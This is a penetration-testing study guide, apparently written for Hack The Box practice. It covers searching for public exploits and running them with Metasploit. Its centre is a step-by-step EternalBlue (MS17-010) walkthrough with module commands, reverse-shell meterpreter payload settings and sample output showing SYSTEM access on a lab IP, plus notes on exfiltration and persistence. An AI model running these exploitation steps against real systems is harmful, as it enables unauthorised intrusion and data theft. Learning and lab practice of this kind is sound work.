# Public Exploits Reference Guide

**Status:** Work in Progress  
**Last Updated:** January 24, 2026

---

## Table of Contents

1. [Introduction & Overview](#introduction--overview)
2. [Finding Public Exploits](#finding-public-exploits)
3. [Metasploit Framework Primer](#metasploit-framework-msfprimer)
4. [Metasploit Practical Usage](#metasploit-practical-usage-example-walkthrough)
5. [Metasploit Practice Boxes](#metasploit-practice-boxes)
6. [Notes](#notes)

---

## Introduction & Overview

### What are Public Exploits?

Public exploits are:
- Known vulnerabilities with published proof-of-concept code
- Exploits for applications/services running on open ports
- Reusable attack code for specific CVEs
- Available in public databases and repositories
- First step after service enumeration with nmap

**When to Search for Public Exploits:**
- After nmap identifies services and versions
- Immediately following service enumeration
- Before attempting custom exploitation
- When version information is known

### When to Use Public Exploits

**Use public exploits when:**
- Service version is identified (nmap -sV)
- Service is known to have published vulnerabilities
- CVE number is available for the service/version
- Time is critical (use proven exploits)
- Service is a known application (SSH, FTP, web services, etc.)

**Exploitation Workflow:**
1. **Enumerate** → Identify service and version with nmap
2. **Search** → Look for public exploits matching version
3. **Verify** → Check if exploit works on target
4. **Exploit** → Run exploit against vulnerable target
5. **Post-Exploit** → Move laterally or escalate privileges

---

## Finding Public Exploits

### Method 1: Google Search

**Basic Google Exploit Search:**
```bash
# Search format: [application_name] [version] exploit
# Example: "openssh 7.2 exploit" or "Apache 2.4.41 vulnerability"

# Results often point to:
- CVE numbers
- Exploit-DB entries
- GitHub repositories
- Security advisories
```

### Method 2: SearchSploit (Local Database)

**What is SearchSploit?**
- Local exploit database search tool
- Part of Exploit-DB project
- Instant searches without internet required
- Contains thousands of public exploits
- Searchable by application name and version

**Installation:**
```bash
sudo apt install exploitdb -y
```

**Basic SearchSploit Usage:**
```bash
# Search for specific application
searchsploit openssh 7.2

# Search for application (any version)
searchsploit apache

# Search with broader terms
searchsploit ftp

# Output shows:
# - Exploit title
# - Path to exploit code (usually /usr/share/exploitdb/exploits/)
# - CVE number
# - Type (RCE, DoS, etc.)
```

**SearchSploit Examples:**
```bash
searchsploit openssh 7.2        # Specific version
searchsploit apache 2.4         # Web server version
searchsploit ssh authentication # Specific vulnerability type
searchsploit windows privilege escalation
```

### Method 3: Online Exploit Databases

**Exploit-DB (https://www.exploit-db.com)**
- Primary source for searchsploit data
- Web interface for searching
- Browsable by category
- CVE linkage
- Download exploits directly

**Rapid7 Vulnerability Database**
- Maintained by Rapid7 (Metasploit creators)
- Focuses on verified exploits
- Linked to Metasploit framework
- Alternative to Exploit-DB

**Vulnerability Lab**
- Specialized vulnerability database
- Detailed vulnerability information
- Academic research focus
- CVE correlations

**CISA KEV (Known Exploited Vulnerabilities)**
- US government source
- CVEs with active exploitation in wild
- Priority list for patching
- Real-world threat intelligence

### Method 4: GitHub Exploit Repositories

```bash
# Search GitHub for exploits
# Format: site:github.com [application_name] exploit

# Common repositories:
- exploits/ folders in pentesting projects
- Individual researcher repositories
- Project-specific exploit collections
```

---

## Metasploit Framework (MSF) Primer

### What is Metasploit?

**Metasploit Framework:**
- Industry-standard penetration testing framework
- Contains hundreds of built-in exploits
- Easiest way to run public exploits against targets
- Created and maintained by Rapid7
- Both community (free) and professional versions

**Why Use Metasploit?**
- Simplified exploit deployment
- Handles payload generation
- Built-in verification scripts
- Post-exploitation tools included
- Large community and documentation
- Perfect for running known public exploits

### Metasploit Key Features

**1. Built-in Exploits**
- Hundreds of public exploits pre-loaded
- Organized by service/vulnerability type
- Version-specific exploit selection
- Easy module loading and configuration

**2. Reconnaissance Scripts**
- Automated enumeration of remote hosts
- Service discovery and fingerprinting
- Port scanning and vulnerability detection
- Host information gathering

**3. Verification Scripts**
- Test vulnerability existence WITHOUT compromising target
- Non-destructive vulnerability assessment
- Safe checking before full exploitation
- Risk-free discovery phase

**4. Meterpreter Payload**
- Post-exploitation shell/agent
- Command execution on compromised target
- Data exfiltration capabilities
- Session management
- Interaction with compromised system

**5. Post-Exploitation Tools**
- Privilege escalation modules
- Lateral movement capabilities
- Data collection and exfiltration
- Persistence mechanisms
- Pivoting into networks

### Metasploit Architecture

```
Metasploit Framework Structure:

MSF Console (msfconsole)
├── Exploits (public vulnerabilities)
├── Payloads (reverse shells, meterpreter)
├── Encoders (obfuscate payloads)
├── Evasion (bypass detection)
├── Auxiliary (scanning, fuzzing tools)
├── Post (post-exploitation modules)
└── Encoders (AV evasion)
```

### When to Use Metasploit vs Manual Exploits

**Use Metasploit when:**
- Running known public exploits (easier)
- Need post-exploitation tools
- Time is critical
- Need payload generation
- Meterpreter session benefits

**Use Manual Exploits when:**
- Metasploit doesn't have the exploit
- Stealth is priority (smaller footprint)
- Custom modifications needed
- Learning/understanding exploitation
- Network restrictions prevent MSF

### Real-World Application

**Typical Metasploit Workflow:**
1. Identify vulnerable service with nmap
2. Search Metasploit for matching exploit
3. Configure exploit with target information
4. Run exploit against target
5. Gain shell/meterpreter session
6. Use post-exploitation modules
7. Maintain access or pivot

---

## Metasploit Practical Usage: Example Walkthrough

### Starting Metasploit Framework

**Launch MSF Console:**
```bash
msfconsole
```

**What happens:**
- Loads Metasploit framework
- Initializes database
- Shows banner with version info
- Presents `msf>` prompt ready for commands

### Example: Finding and Running an Exploit

**Scenario: Vulnerable Application Detection**
After nmap enumeration, you discover:
- Service: OpenSSH
- Version: 7.2
- Port: 22
- Status: Exploitable

**Step 1: Search for Exploit in MSF**
```bash
msf> search openssh 7.2

# Output shows:
# - Module name/path
# - Type (exploit, auxiliary, etc.)
# - Description
# - CVE information
# - Rank (Excellent, Great, Good, Normal, etc.)
```

**Step 2: Select Module to Use**
```bash
msf> use exploit/[module_path]

# Example:
msf> use exploit/linux/ssh/openssh_auth_bypass
```

**Step 3: Configure Module Options**
```bash
msf> show options

# Review required options:
# - RHOSTS (target IP/port)
# - LHOST (your machine IP for reverse shell)
# - LPORT (listening port for reverse shell)
# - PAYLOAD (shell type: meterpreter, bash, etc.)

# Set values:
msf> set RHOSTS 192.168.1.100
msf> set LHOST 192.168.1.50
msf> set LPORT 4444
msf> set PAYLOAD windows/meterpreter/reverse_tcp
```

**Step 4: Run Exploit**
```bash
msf> exploit

# Metasploit will:
# 1. Generate payload
# 2. Set up listener
# 3. Send exploit to target
# 4. Wait for callback
# 5. Establish session if successful
```

**Step 5: Access Compromised System**
```bash
# If successful, you get a shell/meterpreter session
# Example output:
# [*] Sending stage (123456 bytes) to [TARGET_IP]
# [*] Meterpreter session 1 opened (LOCAL_IP:4444 -> TARGET_IP:45678)

meterpreter> help              # Show available commands
meterpreter> shell             # Drop to system shell
meterpreter> pwd               # Print working directory
meterpreter> ls                # List files
meterpreter> cd directory      # Change directory
```

### Key MSF Commands

**Searching & Selection:**
```bash
search [term]          # Search for exploits
use [module_path]      # Load specific module
info                   # Show module information
show options           # Display configurable options
```

**Configuration:**
```bash
set [OPTION] [VALUE]   # Set option value
setg [OPTION] [VALUE]  # Set global option (applies to all modules)
unset [OPTION]         # Remove option setting
```

**Execution:**
```bash
exploit                # Run the exploit
run                    # Run auxiliary modules
check                  # Verify vulnerability (non-destructive)
```

**Session Management:**
```bash
sessions               # List active sessions
sessions -i [ID]       # Interact with specific session
kill [ID]              # Terminate session
```

### Common Metasploit Payloads

**Shell Payloads:**
- `cmd/unix/reverse_bash` - Bash reverse shell
- `cmd/windows/reverse_powershell` - PowerShell shell
- `shell/reverse_tcp` - Generic reverse shell

**Meterpreter Payloads:**
- `windows/meterpreter/reverse_tcp` - Windows meterpreter
- `linux/x86/meterpreter/reverse_tcp` - Linux meterpreter (32-bit)
- `linux/x64/meterpreter/reverse_tcp` - Linux meterpreter (64-bit)

**Why Meterpreter?**
- Post-exploitation tools built-in
- Easy lateral movement
- File upload/download
- System command execution
- Persistence options

### Workflow Summary

```
1. Nmap Scan
   ↓
2. Identify Service & Version
   ↓
3. msfconsole
   ↓
4. search [service] [version]
   ↓
5. use [exploit_path]
   ↓
6. set RHOSTS [TARGET_IP]
   ↓
7. set PAYLOAD [desired_payload]
   ↓
8. exploit
   ↓
9. Session established
   ↓
10. Post-exploitation
```

---

## Metasploit Practical Example: EternalBlue (MS17-010)

### Complete Exploitation Walkthrough

**Scenario: Windows SMB Vulnerability (MS17-010)**
Target identified: Windows Server with SMB on port 445

### Step 1: Search for Exploit

**Command:**
```bash
msfconsole
msf6> search exploit eternalblue
```

**Output shows:**
- `exploit/windows/smb/ms17_010_psexec` - Primary exploit module
- CVE-2017-0144 (EternalBlue)
- Rank: Excellent
- Description: Microsoft Windows SMB RCE

**Advanced Search with Filters:**
```bash
# Search with specific filters
msf6> search cve:2017 type:exploit

# Search syntax:
search [term]                    # Basic search
search cve:2017                  # Filter by CVE year
search type:exploit              # Filter by type
search rank:excellent            # Filter by rank
search platform:windows          # Filter by platform

# See all filters:
msf6> help search
```

### Step 2: Load Exploit Module

**Command:**
```bash
msf6> use exploit/windows/smb/ms17_010_psexec
```

**Output:**
```
[*] Using exploit/windows/smb/ms17_010_psexec
msf6 exploit(windows/smb/ms17_010_psexec) >
```

Notice the prompt changes to show active module

### Step 3: View Module Options

**Command:**
```bash
msf6 exploit(windows/smb/ms17_010_psexec) > show options
```

**Output Example:**
```
Module options (exploit/windows/smb/ms17_010_psexec):

   Name                    Current Setting  Required  Description
   ----                    ---------------  --------  -----------
   RHOSTS                                   yes       The target host(s)
   LHOST                   192.168.1.50     yes       The listen address
   LPORT                   4444             no        The listen port
   PAYLOAD                 windows/meterp.. no        The payload to use
   SMBDomain               .                no        The Windows domain
   SMBPass                                  no        The password for SMB auth
   SMBUser                                  no        The username for SMB auth
```

**Key Fields:**
- `Required: yes` = Must be configured
- `Required: no` = Optional but may improve success
- `Current Setting` = Default value (if any)

### Step 4: Configure Required Options

**Option 1: Set Target Host (RHOSTS)**
```bash
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
```

**RHOSTS can be:**
- Single IP: `10.10.10.40`
- Multiple IPs: `10.10.10.40,10.10.10.41,10.10.10.42`
- CIDR range: `10.10.10.0/24`
- File of IPs: `file:/path/to/ips.txt`

**Option 2: Set Attack Host (LHOST)**
```bash
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```

**LHOST can be:**
- Specific IP: `192.168.1.50`
- Network interface name: `tun0`, `eth0`, `wlan0`
- MSF automatically resolves interface to IP

**Why use interface name?**
- Portable across different networks
- Auto-resolves to correct IP
- No need to hardcode IPs

**Verify Configuration:**
```bash
msf6 exploit(windows/smb/ms17_010_psexec) > show options

# Confirm RHOSTS and LHOST are set correctly
```

### Step 5: Verify Vulnerability (Optional but Recommended)

**Command:**
```bash
msf6 exploit(windows/smb/ms17_010_psexec) > check
```

**Output:**
```
[+] 10.10.10.40:445 - The target is vulnerable.
```

**What Check Does:**
- Tests if target is vulnerable WITHOUT exploiting
- Non-destructive reconnaissance
- Safe way to verify before full exploitation
- Not all exploits support check function

**Output meanings:**
- `[+] vulnerable` - Target IS vulnerable, safe to exploit
- `[*] unknown` - Cannot determine vulnerability status
- `[-] not vulnerable` - Target is NOT vulnerable

### Step 6: Run Exploitation

**Command (Option 1):**
```bash
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
```

**Command (Option 2):**
```bash
msf6 exploit(windows/smb/ms17_010_psexec) > run
```

**Expected Output on Success:**
```
[*] Started reverse TCP handler on 192.168.1.50:4444
[*] 10.10.10.40:445 - Connecting to target...
[*] 10.10.10.40:445 - Exploiting...
[*] Sending stage (123456 bytes) to 10.10.10.40
[+] 10.10.10.40:445 - Exploit completed, but no session was created.
[*] Meterpreter session 1 opened (192.168.1.50:4444 -> 10.10.10.40:4578)

meterpreter >
```

### Step 7: Access Compromised System

**Get Interactive Shell:**
```bash
meterpreter > shell
```

**Now you have command execution:**
```bash
C:\> whoami
C:\> ipconfig
C:\> cd \Users
C:\Users> dir
```

**Key Meterpreter Commands:**
```bash
shell              # Drop to system shell
pwd                # Print working directory
ls / dir           # List files
cd [directory]     # Change directory
cat [file]         # Read file contents
upload [file]      # Upload file to target
download [file]    # Download file from target
getuid             # Get current user
getsystem          # Attempt privilege escalation
```

### Complete Example: EternalBlue Exploitation

```bash
# 1. Start MSF
msfconsole

# 2. Search for exploit
msf6> search eternalblue

# 3. Load exploit
msf6> use exploit/windows/smb/ms17_010_psexec

# 4. View options
msf6 exploit(windows/smb/ms17_010_psexec) > show options

# 5. Set target
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40

# 6. Set callback IP
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0

# 7. Verify vulnerability
msf6 exploit(windows/smb/ms17_010_psexec) > check
# [+] 10.10.10.40:445 - The target is vulnerable.

# 8. Run exploit
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
# [*] Meterpreter session 1 opened

# 9. Access shell
meterpreter > shell
C:\> whoami
nt authority\system

# SUCCESS: Admin access achieved!
```

### Search Command Advanced Filters

**Common Search Filters:**
```bash
search cve:2017          # Search by CVE year
search type:exploit      # Search by type (exploit, auxiliary, etc.)
search platform:windows  # Search by target platform
search rank:excellent    # Search by reliability rank
search author:msf        # Search by author

# Combine filters:
search cve:2017 type:exploit platform:windows rank:excellent
```

**Exploit Ranks (Reliability):**
- `Excellent` - Reliable, high success rate
- `Great` - Mostly reliable
- `Good` - Generally works
- `Normal` - Average reliability
- `Low` - Use with caution

### Metasploit Practice Boxes

The following Hack the Box machines are ideal for practicing Metasploit exploitation:

| Box Name | Difficulty | Vulnerability | Key Exploit |
|----------|-----------|---------------|------------|
| **Blue** | Easy | MS17-010 (EternalBlue) | SMB RCE |
| **Lame** | Easy | Samba 3.0.20 | SMB RCE / OpenSSH |
| **Legacy** | Easy | MS17-010 / MS08-067 | SMB RCE |
| **Granny** | Easy | IIS WebDAV | HTTP PUT / ASP RCE |
| **Grandpa** | Easy | IIS WebDAV | HTTP PUT / ASP RCE |
| **Jerry** | Easy | Apache Tomcat | Tomcat Manager RCE |
| **Optimum** | Easy | HttpFileServer 2.3 | HFS RCE |
| **Devel** | Easy | FTP + IIS | WebShell Upload |

**Recommended Learning Path:**
1. **Blue** (MS17-010/EternalBlue) - Classic SMB exploitation
2. **Lame** (Samba RCE) - Alternative SMB vulnerability
3. **Legacy** (Multiple SMB exploits) - Compare exploitation methods
4. **Jerry** (Tomcat) - Different service exploitation
5. **Optimum** (HFS) - HTTP-based vulnerability
6. **Devel** (Upload + WebShell) - Combines FTP and web exploitation
7. **Granny/Grandpa** (WebDAV) - Advanced HTTP exploitation

**Why These Boxes:**
- ✅ All have known public exploits in Metasploit
- ✅ Demonstrate different vulnerability types
- ✅ Beginner-friendly but realistic
- ✅ Great for practicing search → use → configure → exploit workflow
- ✅ Build confidence with successful exploitation
- ✅ Reinforce methodology before harder machines

---

## Notes

- Add exploit discoveries as you complete boxes
- Document what worked and what didn't
- Include CVE numbers and version-specific vulnerabilities
- Record modifications made to exploits
- Build your personal exploit database over time
